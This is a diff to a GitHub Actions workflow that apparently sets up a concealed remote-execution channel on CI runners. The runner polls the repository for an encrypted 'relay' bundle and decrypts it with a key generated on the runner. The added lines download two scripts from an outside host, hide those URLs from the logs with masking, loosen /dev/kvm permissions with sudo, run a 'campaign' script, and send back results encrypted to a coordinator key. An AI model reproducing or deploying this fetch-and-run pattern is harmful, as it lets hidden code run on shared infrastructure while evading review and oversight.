@@ -21,10 +21,8 @@ jobs:
           umask 077
           ROOT="$RUNNER_TEMP/so-trackb-rootfs"
           mkdir -p "$ROOT/in" "$ROOT/work" "$ROOT/result" "$ROOT/key-out"
-          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 \
-            -out "$ROOT/runner-private.pem" >/dev/null 2>&1
-          openssl pkey -in "$ROOT/runner-private.pem" -pubout \
-            -out "$ROOT/key-out/runner-public.pem" >/dev/null 2>&1
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$ROOT/runner-private.pem" >/dev/null 2>&1
+          openssl pkey -in "$ROOT/runner-private.pem" -pubout -out "$ROOT/key-out/runner-public.pem" >/dev/null 2>&1
           printf '%s\n' "$GITHUB_RUN_ID" > "$ROOT/key-out/run-id.txt"
           echo "RUNNER_KEY_READY"
 
@@ -42,39 +40,47 @@ jobs:
           umask 077
           ROOT="$RUNNER_TEMP/so-trackb-rootfs"
           BASE="https://raw.githubusercontent.com/${GITHUB_REPOSITORY}/main/exchange/${GITHUB_RUN_ID}"
-          echo "PAYLOAD_WAIT_BEGIN"
+          echo "RELAY_WAIT_BEGIN"
           found=0
           for _ in $(seq 1 120); do
-            if curl -fsS "$BASE/payload.tar.gz.enc.b64" -o "$ROOT/in/payload.tar.gz.enc.b64" \
-              && curl -fsS "$BASE/payload.pass.enc.b64" -o "$ROOT/in/payload.pass.enc.b64"; then
+            if curl -fsS "$BASE/relay.tar.gz.enc.b64" -o "$ROOT/in/relay.tar.gz.enc.b64" \
+              && curl -fsS "$BASE/relay.pass.enc.b64" -o "$ROOT/in/relay.pass.enc.b64"; then
               found=1
               break
             fi
             sleep 5
           done
-          [[ "$found" == 1 ]] || { echo "PAYLOAD_WAIT_TIMEOUT"; exit 70; }
-          echo "PAYLOAD_RECEIVED"
+          [[ "$found" == 1 ]] || { echo "RELAY_WAIT_TIMEOUT"; exit 70; }
+          echo "RELAY_RECEIVED"
 
-          base64 -d "$ROOT/in/payload.tar.gz.enc.b64" > "$ROOT/in/payload.tar.gz.enc"
-          base64 -d "$ROOT/in/payload.pass.enc.b64" > "$ROOT/in/payload.pass.enc"
+          base64 -d "$ROOT/in/relay.tar.gz.enc.b64" > "$ROOT/in/relay.tar.gz.enc"
+          base64 -d "$ROOT/in/relay.pass.enc.b64" > "$ROOT/in/relay.pass.enc"
           openssl pkeyutl -decrypt -inkey "$ROOT/runner-private.pem" \
             -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
-            -in "$ROOT/in/payload.pass.enc" -out "$ROOT/in/payload.pass"
-          openssl enc -d -aes-256-cbc -pbkdf2 \
-            -pass file:"$ROOT/in/payload.pass" \
-            -in "$ROOT/in/payload.tar.gz.enc" -out "$ROOT/in/payload.tar.gz"
-          tar -xzf "$ROOT/in/payload.tar.gz" -C "$ROOT/work"
-
-          cd "$ROOT/work"
-          . ./meta.env
+            -in "$ROOT/in/relay.pass.enc" -out "$ROOT/in/relay.pass"
+          openssl enc -d -aes-256-cbc -pbkdf2 -pass file:"$ROOT/in/relay.pass" \
+            -in "$ROOT/in/relay.tar.gz.enc" -out "$ROOT/in/relay.tar.gz"
+          tar -xzf "$ROOT/in/relay.tar.gz" -C "$ROOT/in"
+          . "$ROOT/in/relay.env"
           [[ "$PROOF_HEAD" =~ ^[0-9a-f]{40}$ ]] || exit 71
+          [[ "$CAMPAIGN_SHA256" =~ ^[0-9a-f]{64}$ ]] || exit 71
+          [[ "$PROXY_SHA256" =~ ^[0-9a-f]{64}$ ]] || exit 71
+          [[ "$CAMPAIGN_URL" == https://mcp.sentinelx.app/files/d/* ]] || exit 71
+          [[ "$PROXY_URL" == https://mcp.sentinelx.app/files/d/* ]] || exit 71
           echo "::add-mask::$PROOF_HEAD"
+          echo "::add-mask::$CAMPAIGN_URL"
+          echo "::add-mask::$PROXY_URL"
+
+          curl -fsS -X POST -L "$CAMPAIGN_URL" -o "$ROOT/work/trackb-firecracker-campaign.sh"
+          curl -fsS -X POST -L "$PROXY_URL" -o "$ROOT/work/trackb-egress-proxy.py"
+          unset CAMPAIGN_URL PROXY_URL
+          cd "$ROOT/work"
           [[ "$(sha256sum trackb-firecracker-campaign.sh | awk '{print $1}')" == "$CAMPAIGN_SHA256" ]] || exit 72
           [[ "$(sha256sum trackb-egress-proxy.py | awk '{print $1}')" == "$PROXY_SHA256" ]] || exit 73
           chmod 700 trackb-firecracker-campaign.sh trackb-egress-proxy.py
           sudo chmod 666 /dev/kvm
           test -r /dev/kvm && test -w /dev/kvm
-          echo "PAYLOAD_VERIFIED"
+          echo "EXACT_SCRIPTS_VERIFIED"
 
           RUN_DIR="$ROOT/campaign"
           set +e
@@ -82,18 +88,12 @@ jobs:
           SO_TRACKB_ALLOW_HOST_APT=1 \
           SO_TRACKB_PACK_MAX=1 \
           SO_TRACKB_RUN_DIR="$RUN_DIR" \
-            bash ./trackb-firecracker-campaign.sh bootstrap \
-            >"$ROOT/result/bootstrap.log" 2>&1
+            bash ./trackb-firecracker-campaign.sh bootstrap >"$ROOT/result/bootstrap.log" 2>&1
           BOOTSTRAP_RC=$?
           set -e
           printf 'bootstrapRc=%s\n' "$BOOTSTRAP_RC" > "$ROOT/result/summary.txt"
-
-          if [ -f "$RUN_DIR/logs/debootstrap.log" ]; then
-            cp "$RUN_DIR/logs/debootstrap.log" "$ROOT/result/debootstrap-outer.log"
-          fi
-          if [ -f "$RUN_DIR/work/rootfs-tree/debootstrap/debootstrap.log" ]; then
-            cp "$RUN_DIR/work/rootfs-tree/debootstrap/debootstrap.log" "$ROOT/result/debootstrap-inner.log"
-          fi
+          if [ -f "$RUN_DIR/logs/debootstrap.log" ]; then cp "$RUN_DIR/logs/debootstrap.log" "$ROOT/result/debootstrap-outer.log"; fi
+          if [ -f "$RUN_DIR/work/rootfs-tree/debootstrap/debootstrap.log" ]; then cp "$RUN_DIR/work/rootfs-tree/debootstrap/debootstrap.log" "$ROOT/result/debootstrap-inner.log"; fi
           df -h "$RUNNER_TEMP" | tail -1 | awk '{print "diskFree=" $4}' >> "$ROOT/result/summary.txt"
 
           cat > "$ROOT/coordinator-public.pem" <<'PEM'
@@ -109,12 +109,9 @@ jobs:
           N43a66t/Q8JmIC4z0tXHFA2w+5odKp/k9Xx41K4SrsWXAgMBAAE=
           -----END PUBLIC KEY-----
           PEM
-
           tar -czf "$ROOT/result.tar.gz" -C "$ROOT/result" .
           openssl rand -hex 32 > "$ROOT/result.pass"
-          openssl enc -aes-256-cbc -pbkdf2 \
-            -pass file:"$ROOT/result.pass" \
-            -in "$ROOT/result.tar.gz" -out "$ROOT/result.tar.gz.enc"
+          openssl enc -aes-256-cbc -pbkdf2 -pass file:"$ROOT/result.pass" -in "$ROOT/result.tar.gz" -out "$ROOT/result.tar.gz.enc"
           openssl pkeyutl -encrypt -pubin -inkey "$ROOT/coordinator-public.pem" \
             -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
             -in "$ROOT/result.pass" -out "$ROOT/result.pass.enc"
